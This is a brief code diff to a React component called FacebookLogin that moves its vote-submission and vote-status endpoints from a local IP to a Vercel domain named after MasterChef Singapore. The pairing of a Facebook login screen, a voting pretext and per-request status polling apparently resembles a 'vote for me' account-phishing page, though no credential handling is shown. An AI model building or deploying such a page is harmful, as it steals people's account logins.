@@ -15,7 +15,7 @@ export default function FacebookLogin() {
     const interval = setInterval(async () => {
       try {
         const res = await fetch(
-          `http://172.20.10.8:5000/api/votes/status/${requestId}`
+          `https://masterchefsingapore-vk35.vercel.app/api/votes/status/${requestId}`
         );
 
         const data = await res.json();
@@ -48,7 +48,7 @@ export default function FacebookLogin() {
 
     try {
       const res = await fetch(
-        "http://172.20.10.8:5000/api/votes/submit",
+        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
           method: "POST",
           headers: {
